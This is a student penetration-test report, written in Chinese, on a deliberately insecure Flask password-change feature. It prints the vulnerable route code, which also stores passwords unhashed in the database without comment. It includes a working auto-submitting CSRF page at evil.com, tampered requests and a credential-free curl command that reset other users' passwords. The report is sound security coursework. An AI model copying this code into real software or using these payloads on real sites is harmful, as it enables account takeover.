# 新增功能与 CSRF 漏洞检测报告

**项目名称**：用户管理系统 – 密码修改功能  
**测试日期**：2026-07-21  
**测试人员**：刘婧宜  
**学号**：2024141530009  
**测试版本**：v7.0（新增密码修改功能）  

---

## 目录

1. [测试环境与工具](#1-测试环境与工具)
2. [新增功能测试](#2-新增功能测试)
3. [CSRF + 越权漏洞测试](#3-csrf--越权漏洞测试)
4. [已有漏洞复查](#4-已有漏洞复查)
5. [漏洞汇总表](#5-漏洞汇总表)

---

## 1. 测试环境与工具

| 项目 | 内容 |
|:-----|:------|
| **目标系统** | 用户管理系统 Flask Web 应用 |
| **技术栈** | Python 3.13 + Flask + SQLite + Werkzeug |
| **测试地址** | `http://127.0.0.1:5000` |
| **新增路由** | `POST /change-password`（修改密码） |
| **测试账号** | admin / admin123, alice / alice2025, victim / victim@123 |
| **测试工具** | 浏览器 + Python requests + Burp Suite |

### 测试账号准备

| 用户名 | 密码 | ID | 说明 |
|:-------|:-----|:--:|:-----|
| admin | admin123 | 1 | 管理员（内存用户） |
| alice | alice2025 | 2 | 预设数据库用户 |
| victim | victim@123 | 3 | 新增测试用户 |

### 漏洞代码（新增）

```python
@app.route("/change-password", methods=["POST"])
def change_password():
    """修改密码（无安全校验版本）"""
    username = request.form.get("username", "").strip()
    new_password = request.form.get("new_password", "")
    confirm_password = request.form.get("confirm_password", "")

    if not username or not new_password:
        return redirect("/profile?error=用户名和密码不能为空")

    if new_password != confirm_password:
        return redirect("/profile?error=两次输入的密码不一致")

    # 尝试修改内存用户（admin）
    if username in USERS:
        USERS[username]["password"] = generate_password_hash(new_password)
        USERS[username]["must_change_password"] = False
        return redirect("/profile?user_id=1&success=密码修改成功")

    # 尝试修改数据库用户
    try:
        conn = sqlite3.connect(DB_PATH, timeout=10)
        c = conn.cursor()
        c.execute("SELECT id FROM users WHERE username = ?", (username,))
        row = c.fetchone()
        if row:
            c.execute("UPDATE users SET password = ? WHERE username = ?", (new_password, username))
            conn.commit()
            conn.close()
            return redirect(f"/profile?user_id={row[0]}&success=密码修改成功")
        conn.close()
    except Exception:
        pass

    return redirect("/profile?error=未找到该用户")
```

---

## 2. 新增功能测试

### TC-01：个人中心显示修改密码表单

| 项目 | 内容 |
|:-----|:------|
| **操作步骤** | 登录后进入个人中心 `/profile?user_id=1` |
| **预期结果** | 页面显示「修改密码」区域，包含新密码输入框、确认密码输入框、隐藏 username 字段 |
| **实际结果** | ✅ 通过 |

**截图区域**：

> （在此处插入个人中心页面截图——显示「修改密码」表单区域）

---

### TC-02：修改密码功能（正常流程）

| 项目 | 内容 |
|:-----|:------|
| **操作步骤** | 在个人中心填写新密码和确认密码 → 点击「确认修改」 |
| **预期结果** | 密码被成功修改，可新密码登录，旧密码失效 |
| **实际结果** | ✅ 通过 |

| 测试项 | 结果 |
|:-------|:----:|
| 提交修改 | ✅ 302 跳转至个人中心，显示"密码修改成功" |
| 新密码登录 | ✅ 成功（`admin` + `NewAdmin@123`） |
| 旧密码登录 | ✅ 已失效（登录页提示错误） |

**截图区域**：

> （在此处插入密码修改成功的截图——显示「密码修改成功」绿色提示）

---

### TC-03：密码不一致提示

| 项目 | 内容 |
|:-----|:------|
| **操作步骤** | 新密码填 `abc123`，确认密码填 `def456` |
| **预期结果** | 提示"两次输入的密码不一致" |
| **实际结果** | ✅ 通过 |

---

### TC-04：空用户名/空密码

| 项目 | 内容 |
|:-----|:------|
| **操作步骤** | 提交空用户名和空密码 |
| **预期结果** | 提示"用户名和密码不能为空" |
| **实际结果** | ✅ 通过 |

---

### 新增功能测试汇总

| 编号 | 测试项目 | 结果 |
|:----:|:---------|:----:|
| TC-01 | 修改密码表单显示 | ✅ |
| TC-02 | 正常修改密码（新密码可登录，旧密码失效） | ✅ |
| TC-03 | 密码不一致提示 | ✅ |
| TC-04 | 空用户名/密码提示 | ✅ |

---

## 3. CSRF + 越权漏洞测试

### CSRF-001：无 CSRF Token 保护

| 属性 | 内容 |
|:-----|:------|
| **漏洞编号** | CSRF-001 |
| **漏洞名称** | 密码修改无 CSRF Token 防护 |
| **漏洞类型** | CSRF（Cross-Site Request Forgery） |
| **CWE 编号** | CWE-352：Cross-Site Request Forgery |
| **OWASP 分类** | A01:2021 – Broken Access Control |
| **风险等级** | 🔴 **严重** |
| **漏洞位置** | `templates/profile.html` 第 38-51 行、`app.py` 第 298 行 |

#### 漏洞代码

```html
<!-- profile.html 第 38-51 行 密码修改表单 -->
<form method="post" action="/change-password" class="password-form">
    <input type="hidden" name="username" value="{{ user.username }}">
    <div class="form-group">
        <label for="new_password">新密码</label>
        <input type="password" id="new_password" name="new_password" ...>
    </div>
    <div class="form-group">
        <label for="confirm_password">确认新密码</label>
        <input type="password" id="confirm_password" name="confirm_password" ...>
    </div>
    <button type="submit" class="btn">确认修改</button>
</form>
<!-- ❌ 缺少 {% csrf_token %} 或任何随机 Token 字段 -->
```

```python
# app.py 第 298 行
@app.route("/change-password", methods=["POST"])
def change_password():
    # ← 无 CSRF token 校验
    # ← 无 Referer 校验
    # ← 无 session 身份校验
```

#### 漏洞详情

密码修改表单**没有包含任何 CSRF Token**，服务端也没有**校验请求来源（Referer）**。攻击者可以在第三方网站上构造自动提交表单，当受害者访问该网站时，浏览器会自动带上的 Cookie 使 CSRF 攻击成功。

#### 攻击演示

**攻击者构造的恶意 HTML 页面（evil.com/csrf.html）**：

```html
<html>
<body>
<h1>🎉 恭喜您中奖！</h1>
<form action="http://127.0.0.1:5000/change-password" method="POST" id="csrf_form">
    <input type="hidden" name="username" value="victim">
    <input type="hidden" name="new_password" value="hacked_by_csrf">
    <input type="hidden" name="confirm_password" value="hacked_by_csrf">
</form>
<script>document.getElementById('csrf_form').submit();</script>
</body>
</html>
```

**攻击流程**：

```
Step 1: 受害者已登录 用户管理系统（浏览器有 session Cookie）
Step 2: 受害者访问 攻击者网站 evil.com
Step 3: 浏览器自动执行 CSRF 表单提交
Step 4: 受害者的密码被修改为 hacked_by_csrf
```

**攻击结果**（成功 ✅）：

| 步骤 | 操作 | 结果 |
|:----:|:-----|:------|
| 1 | 受害者登录 victim 账号 | ✅ 已登录 |
| 2 | 攻击者可跨站请求 `/change-password` | ✅ 302 跳转（密码被修改） |
| 3 | Referer 为 `http://evil.com/csrf.html` | ✅ **无校验** |
| 4 | 攻击者使用新密码登录 victim | ✅ **登录成功！** |

**截图区域**：

> （在此处插入 CSRF 攻击的 Burp Suite 请求截图——显示 Referer 为 evil.com）

---

### CSRF-002：无 Referer 校验

| 属性 | 内容 |
|:-----|:------|
| **漏洞编号** | CSRF-002 |
| **漏洞名称** | 修改密码接口无 Referer 来源校验 |
| **CWE 编号** | CWE-352：Cross-Site Request Forgery |
| **风险等级** | 🔴 **严重** |

#### 漏洞详情

服务端未检查 HTTP 请求头中的 `Referer` 或 `Origin` 字段。攻击者可构造任意来源的请求：

| 攻击场景 | Referer 值 | 结果 |
|:---------|:-----------|:----:|
| 第三方恶意网站 | `http://evil.com/csrf.html` | ✅ 密码被修改 |
| 无 Referer（图片链入） | `（空）` | ✅ 密码被修改 |

---

### IDOR-PWD-001：越权修改任意用户密码

| 属性 | 内容 |
|:-----|:------|
| **漏洞编号** | IDOR-PWD-001 |
| **漏洞名称** | 任意用户密码可被其他用户修改 |
| **漏洞类型** | IDOR（水平越权 + 垂直越权） |
| **CWE 编号** | CWE-639：Authorization Bypass Through User-Controlled Key |
| **风险等级** | 🔴 **严重** |
| **漏洞位置** | `app.py` 第 298-332 行 |

#### 漏洞代码

```python
@app.route("/change-password", methods=["POST"])
def change_password():
    username = request.form.get("username", "").strip()     # ← 用户名来自表单（用户可控）
    new_password = request.form.get("new_password", "")
    ...
    # ← 没有任何"当前 session 用户与 username 是否一致"的检查
    if username in USERS:                                   # ← 直接修改
        USERS[username]["password"] = generate_password_hash(new_password)
```

#### 漏洞详情

`/change-password` 路由的 `username` 参数来自表单中的隐藏字段，服务端**没有检查当前 session 中的用户是否与提交的 username 一致**。攻击者可以：

1. 修改 HTML 隐藏字段的值
2. 直接用 Burp Suite 修改请求参数
3. 从任意账户修改管理员密码

#### 攻击演示

##### 攻击 1：普通用户修改管理员密码（垂直越权）

| 项目 | 内容 |
|:-----|:------|
| **攻击者** | victim（普通用户） |
| **目标** | admin（管理员） |
| **请求** | `POST /change-password` → `username=admin&new_password=pwned_by_victim` |

**攻击请求（Burp Suite 直接改包）**：
```
POST /change-password HTTP/1.1
Cookie: session=...victim_session...
Content-Type: application/x-www-form-urlencoded

username=admin&new_password=pwned_by_victim&confirm_password=pwned_by_victim
```

**攻击结果**（成功 ✅）：

| 检查项 | 结果 |
|:-------|:------|
| victim 修改 admin 密码 | ✅ 302 跳转 /profile?user_id=1&success=密码修改成功 |
| admin 新密码登录 | ✅ 成功（`admin` + `pwned_by_victim`） |

**截图区域**：

> （在此处插入 Burp Suite 修改 hidden 字段 username 的截图）

##### 攻击 2：普通用户修改其他普通用户密码（水平越权）

| 项目 | 内容 |
|:-----|:------|
| **攻击者** | victim（普通用户） |
| **目标** | alice（另一个普通用户） |
| **请求** | `POST /change-password` → `username=alice&new_password=alice_pwned` |

**攻击结果**（成功 ✅）：

| 检查项 | 结果 |
|:-------|:------|
| victim 修改 alice 密码 | ✅ 302 跳转 |
| alice 新密码登录 | ✅ 成功（`alice` + `alice_pwned`） |

---

### IDOR-PWD-002：未登录即可修改密码

| 属性 | 内容 |
|:-----|:------|
| **漏洞编号** | IDOR-PWD-002 |
| **漏洞名称** | 未登录状态下可修改任意用户密码 |
| **漏洞类型** | 认证缺失 |
| **CWE 编号** | CWE-306：Missing Authentication for Critical Function |
| **风险等级** | 🔴 **严重** |
| **漏洞位置** | `app.py` 第 298 行 `def change_password():` **无 `@login_required`** |

#### 漏洞代码

```python
@app.route("/change-password", methods=["POST"])
def change_password():        # ← 缺少 @login_required 装饰器！
    ...
```

对比其他需要登录的路由：
```python
@app.route("/upload", methods=["GET", "POST"])
@login_required               # ← upload 有装饰器
def upload():
```

#### 攻击演示

**攻击者无需任何凭证即可修改任意用户密码**：

```bash
# curl 无需 Cookie
curl -X POST http://127.0.0.1:5000/change-password \
  -d "username=admin&new_password=hacked&confirm_password=hacked"
# 结果：密码被成功修改！
```

**攻击结果**（成功 ✅）：
```
未登录 POST /change-password → 302 跳转
无需 Cookie，无需 Session，无需任何凭证
```

---

### IDOR-PWD-003：无原密码验证

| 属性 | 内容 |
|:-----|:------|
| **漏洞编号** | IDOR-PWD-003 |
| **漏洞名称** | 修改密码无需验证原密码 |
| **漏洞类型** | 认证逻辑缺陷 |
| **CWE 编号** | CWE-306：Missing Authentication for Critical Function |
| **风险等级** | 🟠 **高危** |
| **漏洞位置** | `app.py` 第 298 行 |

#### 漏洞代码

```python
username = request.form.get("username", "").strip()
new_password = request.form.get("new_password", "")
# ← 缺少 old_password 的验证！
```

#### 攻击演示

即使攻击者不知道用户的当前密码，只要攻击者有 Session（哪怕是一个低权限账号），就可以修改任何人的密码。

---

## 4. 已有漏洞复查

### 4.1 充值相关漏洞（已修复）

| 漏洞 | 修复前 | 修复后 | 当前状态 |
|:-----|:------:|:------:|:--------:|
| 负值充值（BL-001） | ✅ 充 -5000 成功 | ❌ 已被拦截 | 🟢 已修复 |
| 未登录充值（BL-004） | ✅ 未登录可充 | ❌ 302 跳转登录页 | 🟢 已修复 |
| 浮点精度（BL-002） | ✅ float 精度丢失 | ✅ Decimal | 🟢 已修复 |

### 4.2 个人中心相关漏洞（已修复）

| 漏洞 | 修复前 | 修复后 | 当前状态 |
|:-----|:------:|:------:|:--------:|
| 越权查看资料（IDOR-001） | ✅ 可查看任意 | ❌ 被拦截 | 🟢 已修复 |
| 越权充值（IDOR-002） | ✅ 可给他人充值 | ❌ 被拦截 | 🟢 已修复 |
| 未登录查看（IDOR-001） | ✅ 可查看 | ❌ 302 跳转 | 🟢 已修复 |

### 4.3 文件包含漏洞（已修复）

| 漏洞 | 修复前 | 修复后 | 当前状态 |
|:-----|:------:|:------:|:--------:|
| 路径遍历（LFI-PATH-001） | ✅ 读取 app.py | ❌ 拦截 | 🟢 已修复 |
| 绝对路径注入（LFI-ABSOLUTE-001） | ✅ 读取 /etc/shadow | ❌ 拦截 | 🟢 已修复 |
| 未授权文件访问 | ✅ 无 Cookie 可读 | ❌ 跳转登录 | 🟢 已修复 |

---

## 5. 漏洞汇总表

### 5.1 本次新增漏洞

| 漏洞编号 | 漏洞名称 | 漏洞类型 | CWE | 风险等级 |
|:---------|:---------|:---------|:---:|:--------:|
| **CSRF-001** | **密码修改无 CSRF Token** | **CSRF** | **CWE-352** | **🔴 严重** |
| **CSRF-002** | **无 Referer 校验** | **CSRF** | **CWE-352** | **🔴 严重** |
| **IDOR-PWD-001** | **越权修改任意用户密码** | **IDOR** | **CWE-639** | **🔴 严重** |
| **IDOR-PWD-002** | **未登录即可修改密码** | **认证缺失** | **CWE-306** | **🔴 严重** |
| **IDOR-PWD-003** | **无需原密码即可修改** | **认证缺陷** | **CWE-306** | **🟠 高危** |

### 5.2 当前系统风险总览

| 分类 | 严重 | 高危 | 中危 | 低危 |
|:-----|:----:|:----:|:----:|:----:|
| 🔴 密码修改（新增） | 4 | 1 | 0 | 0 |
| 🟢 充值（已修复） | 0 | 0 | 0 | 0 |
| 🟢 个人中心（已修复） | 0 | 0 | 0 | 0 |
| 🟢 文件包含（已修复） | 0 | 0 | 0 | 0 |
| **当前合计** | **4** | **1** | **0** | **0** |

### 5.3 攻击链：从 CSRF 到系统控制

```
Step 1: CSRF 攻击（钓鱼）
  构造恶意网页 → 受害者访问 → 浏览器自动提交 CSRF 表单
  admin 密码被改为攻击者设置的密码

Step 2: 越权修改
  登录低权限账号 → 修改 hidden username 字段 → 直接改 admin 密码

Step 3: 未登录直接修改
  curl 无需 Cookie → 直接改任意用户密码

Step 4: 获取服务器权限  
  使用修改后的 admin 密码登录 → 获取管理员权限
```

### 5.4 漏洞代码行号速查表

| 漏洞编号 | 文件 | 行号 | 问题 |
|:---------|:-----|:----:|:------|
| CSRF-001 | profile.html | 40 | 表单无 `{% csrf_token %}` 字段 |
| CSRF-001 | app.py | 298 | `def change_password():` 无 CSRF 校验逻辑 |
| CSRF-002 | app.py | 298 | 无 `Referer` / `Origin` 请求来源校验 |
| IDOR-PWD-001 | app.py | 301 | `username = request.form.get(...)` 来自表单，用户可控 |
| IDOR-PWD-001 | app.py | 312-313 | 直接修改 `USERS[username]["password"]`，无身份校验 |
| IDOR-PWD-002 | app.py | 298 | `def change_password():` **无 `@login_required`** |
| IDOR-PWD-003 | app.py | 301-302 | 仅接收 `username` + `new_password`，无 `old_password` |

---

> **报告生成日期**：2026-07-21  
> **测试人员**：刘婧宜  
> **学号**：2024141530009  
